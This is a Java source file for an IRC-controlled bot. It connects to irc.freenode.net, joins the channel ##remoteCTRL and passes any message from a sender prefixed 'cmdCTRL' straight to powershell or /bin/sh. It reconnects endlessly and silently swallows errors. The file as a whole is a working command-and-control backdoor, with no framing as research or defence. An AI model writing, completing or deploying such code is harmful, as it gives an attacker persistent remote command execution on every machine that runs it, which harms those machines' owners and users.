import java.net.Socket;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class Main {
    public static void core() throws Exception {
	Socket sock = new Socket("irc.freenode.net", 6667);
	BufferedReader i = new BufferedReader(new InputStreamReader(sock.getInputStream()));
	BufferedWriter o = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
	Integer len = 10;
	String hash = "bot-";
	String buffer = new String();
	
	while ((--len) >= 0) hash = hash + Math.round(Math.random() * 1000000) % 10;
	o.write("USER" + " " + hash + " " + hash + " " + hash + " :botCTRL" + "\n");
	o.flush();
	o.write("NICK" + " " + hash + "\n");
	o.flush();
	o.write("JOIN ##remoteCTRL" + "\n");
	o.flush();
	while ((buffer = i.readLine()) != null) {
	    if (buffer.indexOf("PING :") == 0) {
		o.write("PONG :" + buffer.split(":")[(buffer.split(":")).length - 1] + "\n");
		o.flush();
	    }
	    if (buffer.indexOf(":cmdCTRL") == 0) {
		if (System.getProperty("os.name").indexOf("Windows") == 0) {
		    Runtime.getRuntime().exec(new String[] {"powershell", "-C", buffer.split(":")[(buffer.split(":")).length - 1]});
		}
		if (System.getProperty("os.name").indexOf("Windows") != 0) {
		    Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", buffer.split(":")[(buffer.split(":")).length - 1]});
		}
	    }
	}
	sock.close();
    }
    public static void main(String[] args) {
	while (true) {
	    try {
		try {
		    core();
		}
		catch (Exception e) {
		    Thread.sleep(1000);
		}
	    }
	    catch (Exception e) {
	    }
	}
    }
}
